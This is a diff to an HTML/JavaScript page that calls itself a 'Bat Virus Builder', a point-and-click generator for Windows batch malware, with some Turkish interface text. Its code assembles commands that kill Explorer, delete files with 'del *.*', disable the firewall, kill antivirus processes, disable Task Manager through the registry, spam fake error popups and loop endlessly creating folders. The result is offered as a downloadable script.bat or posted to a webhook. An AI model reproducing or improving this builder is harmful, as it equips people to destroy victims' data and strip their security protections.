@@ -20,7 +20,9 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            width: 400px;
+            width: 90%;
+            max-width: 600px;
+            position: relative;
         }
         h1 {
             text-align: center;
@@ -63,14 +65,53 @@
             height: 150px;
             resize: none;
         }
+        .hidden {
+            display: none;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+        .share-section {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .like-button {
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .like-button:hover {
+            background-color: #218838;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+            button {
+                font-size: 14px;
+                padding: 8px;
+            }
+            textarea {
+                height: 120px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Script Generator</h1>
 
-        <label for="webhookUrl">Webhook URL:</label>
-        <input type="text" id="webhookUrl" placeholder="Enter Webhook URL">
+        <label for="webhookUrl">Webhook URL (Optional):</label>
+        <input type="text" id="webhookUrl" placeholder="Enter Webhook URL (Optional)">
+
+        <label for="taskkillPrograms">Taskkill Program Names (comma separated):</label>
+        <input type="text" id="taskkillPrograms" placeholder="Enter program names, e.g., notepad.exe,chrome.exe">
 
         <label><input type="checkbox" id="explorerKill"> Kill Explorer</label>
         <label><input type="checkbox" id="infiniteError"> Infinite Error Message</label>
@@ -80,84 +121,24 @@
         <label><input type="checkbox" id="infiniteFolderCreate"> Infinite Folder Create</label>
         <label><input type="checkbox" id="loopAll"> Loop All</label>
 
-        <button onclick="generateAndSend()">Generate and Send</button>
+        <button onclick="generateAndSend()">Generate Script</button>
 
-        <textarea id="output" readonly></textarea>
+        <textarea id="output" readonly placeholder="Generated script will appear here..."></textarea>
+        
+        <div class="buttons">
+            <button onclick="downloadScript()">Download Script</button>
+            <button onclick="shareScript()">Share Script</button>
+        </div>
+
+        <div class="share-section">
+            <button class="like-button" onclick="likeScript()">Like</button>
+        </div>
     </div>
 
     <script>
-        function createScript(explorerKill, infiniteError, deleteAllFiles, disableFirewall, disableTaskManager, infiniteFolderCreate, loopAll, errorMessage) {
-            let lines = [];
-            
-            // Made with Bat Virus Builder line
-            lines.push("echo Made with Bat Virus Builder\n");
-
-            // @echo off command
-            lines.push("@echo off\n");
-
-            // Explorer Kill command
-            if (explorerKill) {
-                lines.push("taskkill /f /im explorer.exe\n");
-            }
-
-            // Infinite Error command
-            if (infiniteError) {
-                lines.push(
-                    `echo.X=MsgBox("${errorMessage}",0+16,"Windows ") >> FakeErrorMsg.vbs\n` +
-                    `echo.X=MsgBox("${errorMessage}",1+10,"Windows") >> FakeErrorMsg1.vbs\n` +
-                    `echo.X=MsgBox("${errorMessage}",2+32,"Windows") >> FakeErrorMsg2.vbs\n` +
-                    `echo.X=MsgBox("${errorMessage}",3+48,"Windows") >> FakeErrorMsg3.vbs\n` +
-                    'start FakeErrorMsg.vbs >nul 2>&1\n' +
-                    'start FakeErrorMsg1.vbs >nul 2>&1\n' +
-                    'start FakeErrorMsg2.vbs >nul 2>&1\n' +
-                    'start FakeErrorMsg3.vbs >nul 2>&1\n'
-                );
-            }
-
-            // Delete All Files command
-            if (deleteAllFiles) {
-                lines.push("del *.*\n");
-            }
-
-            // Disable Firewall command
-            if (disableFirewall) {
-                lines.push(
-                    'netsh firewall set opmode mode=disable\n' +
-                    'tskill /A av*\n' +
-                    'tskill /A fire*\n' +
-                    'tskill /A anti*\n' +
-                    'cls\n' +
-                    'tskill /A spy*\n' +
-                    'tskill /A bullguard\n'
-                );
-            }
-
-            // Disable Task Manager command
-            if (disableTaskManager) {
-                lines.push('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n');
-            }
-
-            // Infinite Folder Create command
-            if (infiniteFolderCreate) {
-                if (loopAll) {
-                    lines.push(':folderLoop\nmd %random%\ngoto folderLoop\n');
-                } else {
-                    for (let i = 0; i < 15; i++) {
-                        lines.push('md %random%\n');
-                    }
-                }
-            }
-
-            // Loop All command
-            if (loopAll) {
-                lines = ["@echo off\n:loop\n"].concat(lines).concat(["goto loop\n"]);
-            }
-
-            return lines.join('');
-        }
-
         function generateAndSend() {
             const webhookUrl = document.getElementById('webhookUrl').value;
+            const taskkillPrograms = document.getElementById('taskkillPrograms').value.split(',');
             const explorerKill = document.getElementById('explorerKill').checked;
             const infiniteError = document.getElementById('infiniteError').checked;
             const deleteFiles = document.getElementById('deleteFiles').checked;
@@ -166,49 +147,107 @@
             const infiniteFolderCreate = document.getElementById('infiniteFolderCreate').checked;
             const loopAll = document.getElementById('loopAll').checked;
 
-            let errorMessage = "Cihazınız Tehlikede!";
+            let script = `@echo off\nREM Made with Bat Virus Builder\n`;
+
+            if (explorerKill) {
+                script += 'taskkill /f /im explorer.exe\n';
+            }
             if (infiniteError) {
-                errorMessage = prompt("What is the error message?", errorMessage);
-                if (!errorMessage) {
-                    alert("Lütfen bir hata mesajı girin!");
-                    return;
+                const errorMessage = prompt("What is the error message?");
+                script += `
+echo.X=MsgBox("${errorMessage}",0+16,"Windows ") >> FakeErrorMsg.vbs
+echo.X=MsgBox("${errorMessage}",1+10,"Windows") >> FakeErrorMsg1.vbs
+echo.X=MsgBox("${errorMessage}",2+32,"Windows") >> FakeErrorMsg2.vbs
+echo.X=MsgBox("${errorMessage}",3+48,"Windows") >> FakeErrorMsg3.vbs\n`;
+
+                if (!loopAll) {
+                    script += `
+start FakeErrorMsg.vbs
+start FakeErrorMsg1.vbs
+start FakeErrorMsg2.vbs
+start FakeErrorMsg3.vbs\n`;
                 }
             }
-
-            if (!webhookUrl) {
-                alert("Lütfen webhook URL'sini girin!");
-                return;
+            if (deleteFiles) {
+                script += 'del *.*\n';
+            }
+            if (disableFirewall) {
+                script += `
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard\n`;
+            }
+            if (disableTaskManager) {
+                script += 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n';
+            }
+            if (infiniteFolderCreate) {
+                if (loopAll) {
+                    script += 'md %random%\n';
+                } else {
+                    for (let i = 0; i < 15; i++) {
+                        script += 'md %random%\n';
+                    }
+                }
+            }
+            if (taskkillPrograms.length > 0) {
+                taskkillPrograms.forEach(program => {
+                    script += `taskkill /f /im ${program.trim()}\n`;
+                });
+            }
+            if (loopAll) {
+                script += ':loop\n';
+                if (infiniteError) {
+                    script += `
+start FakeErrorMsg.vbs
+start FakeErrorMsg1.vbs
+start FakeErrorMsg2.vbs
+start FakeErrorMsg3.vbs\n`;
+                }
+                if (infiniteFolderCreate) {
+                    script += 'md %random%\n';
+                }
+                script += 'goto loop\n';
             }
 
-            const scriptContent = createScript(explorerKill, infiniteError, deleteFiles, disableFirewall, disableTaskManager, infiniteFolderCreate, loopAll, errorMessage);
-            document.getElementById('output').value = scriptContent;
-            
-            sendToWebhook(webhookUrl, scriptContent);
+            document.getElementById('output').value = script;
+
+            if (webhookUrl) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: script })
+                });
+            }
         }
 
-        function sendToWebhook(url, content) {
-            const data = {
-                content: `\`\`\`\n${content}\n\`\`\``
-            };
+        function downloadScript() {
+            const content = document.getElementById('output').value;
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'script.bat';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.status === 204) {
-                    alert("Script başarıyla gönderildi!");
-                } else {
-                    alert("Script gönderilemedi! Lütfen webhook URL'sini kontrol edin.");
-                }
-            })
-            .catch(error => {
-                console.error("Error sending webhook:", error);
-                alert("Script gönderilemedi! Lütfen webhook URL'sini kontrol edin.");
+        function shareScript() {
+            const content = document.getElementById('output').value;
+            navigator.clipboard.writeText(content).then(() => {
+                alert("Script kopyalandı! Paylaşmak için yapıştırabilirsiniz.");
+            }, () => {
+                alert("Script kopyalanamadı! Lütfen tekrar deneyin.");
             });
+        }
+
+        function likeScript() {
+            alert("Beğendiğiniz için teşekkürler!");
         }
     </script>
 </body>
